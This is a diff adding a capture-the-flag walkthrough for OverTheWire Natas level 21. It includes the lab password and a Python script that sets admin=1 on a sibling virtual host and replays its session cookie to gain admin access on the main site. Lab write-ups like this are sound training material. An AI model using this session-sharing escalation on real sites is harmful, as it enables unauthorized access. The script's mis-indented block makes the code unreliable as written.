@@ -1101,6 +1101,65 @@ Step 12: Then you will get the password for Natas21
 + Domain : http://natas21.natas.labs.overthewire.org
 
 ## Explination
+Step 1:  Go to Firefox Browser, Then Connect to natas21.natas.labs.overthewire.org, Then login with username and password
 
+Step 2: You will see the page like this
 
+![image](./images-1/image-21.png)
 
+Step 3: Lets view the source code
+
+![image](./images-1/image-21-1.png)
+
+Step 4: But it has no clue in that code, So we will open another link at what we get from the page
+
+![image](./images-1/image-21-2.png)
+
+Step 5: Lets view the source code
+
+![image](./images-1/image-21-3.png)
+
+Step 6: It has both website hosted same server using diffrent virtual host,  The virtual host method for hosting multiple domains in a single server
+
+Step 7: So, we will Write a code like this, In nano editor, Then save the file, Then Run the file by using python filename. Whole process in kali Linux. Because of it has librabraries, we can't Run it online platform.
+
+    import requests
+
+    username = 'natas21'
+    password = 'BPhv63cKE1lkQl04cE5CuFTzXe15NfiH'
+
+    url_experimenter = 'http://natas21-experimenter.natas.labs.overthewire.org/?debug'
+    url_main = 'http://natas21.natas.labs.overthewire.org'
+
+    session = requests.Session()
+
+    # Step 1: Set admin=1
+    response = session.post(
+             url_experimenter,
+             data={
+            "admin": "1",
+             "submit": "Update"
+             },
+            auth=(username, password)
+             )
+
+    print("Experimenter response:")
+    print(response.text)
+
+    # Step 2: Extract PHPSESSID manually
+    phpsessid = session.cookies.get('PHPSESSID')
+    print("\nPHPSESSID:", phpsessid)
+
+    # Step 3: Send same session ID to main site
+         response = requests.get(
+         url_main,
+         cookies={"PHPSESSID": phpsessid},
+         auth=(username, password)
+         )
+
+    print("\nMain site response:")
+    print(response.text)
+
+ Step 8: Then you will get the password for Natas22
+
+![image](./images-1/image-21-4.png)   
